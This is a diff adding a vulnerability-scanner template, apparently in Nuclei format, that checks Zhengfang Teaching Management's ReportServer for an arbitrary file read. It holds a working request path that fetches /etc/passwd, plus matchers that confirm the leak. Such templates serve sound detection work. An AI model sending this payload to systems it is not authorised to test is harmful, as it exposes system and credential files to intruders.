@@ -1,0 +1,27 @@
+id: zhengfang-reportserver-arbitrary-file-read
+info:
+  name: Zhengfang Teaching Management ReportServer Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Zhengfang Teaching Management Information Service Platform ReportServer is vulnerable to an arbitrary file read vulnerability.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin/bash"
+        part: body
+      - type: regex
+        regex:
+          - "^((?!<).)*$"
+        part: body
+        negative: true
